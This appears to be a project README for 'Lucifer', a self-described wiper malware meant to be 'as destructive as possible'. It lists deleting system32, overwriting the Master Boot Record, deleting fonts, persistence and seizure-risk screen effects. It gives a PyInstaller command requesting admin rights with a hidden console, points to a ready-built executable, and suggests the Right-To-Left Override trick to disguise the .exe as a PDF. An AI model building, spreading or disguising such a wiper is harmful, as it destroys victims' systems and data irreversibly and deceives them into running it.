# Lucifer
Lucifer is a wiper malware that aims to be as destructive as possible 😈

Main features:
- Changes wallpaper
- Flashy epilepsy-inducing GDI effects
- Deletes all fonts
- Persistency
- **Deletes system32 (bypasses permission issues)**
- **Overrides Master Boot Record (MBR)**
- And more!

Definitely an overkill, but the rationale is that even if the MBR was restored, the deleted fonts will make it hard to navigate and the deleted system32 files will make the system unusable anyway.

## Instructions

If you want to make modifications, use [PyInstaller](https://pyinstaller.org/en/stable/) to compile the .py file into an .exe

```
pip install pyinstaller
```
```bash
pyinstaller --hide-console hide-early --uac-admin --onefile --icon=lucifer.ico --add-data "lucifer.jpg;." lucifer.py
```

Or just use the already compiled executable in the `dist` folder.

Some extra fun: I used unicode [U+202E 'Right-To-Left Override'](https://unicode-explorer.com/c/202E) to disguise the .exe as a pdf. Enjoy :)

![Image](https://i.imgur.com/eg9W5y2.png)